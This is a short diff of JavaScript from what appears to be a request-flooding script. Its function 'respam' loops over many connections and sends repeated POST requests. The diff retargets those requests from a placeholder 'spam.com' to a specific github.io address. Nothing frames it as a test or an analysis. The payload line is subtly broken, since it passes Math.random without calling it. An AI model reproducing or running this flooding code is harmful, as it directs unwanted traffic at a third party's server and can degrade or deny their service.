@@ -10,7 +10,7 @@
     }
     function respam() {
       for (i=0;i<connections.length;i++) {
-        connections[i].open("POST", "spam.com", true);
+        connections[i].open("POST", "https://supersirbird.github.io/cmd_exe/", true);
         connections[i].setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         connections[i].send(Math.round(Math.random))
       }
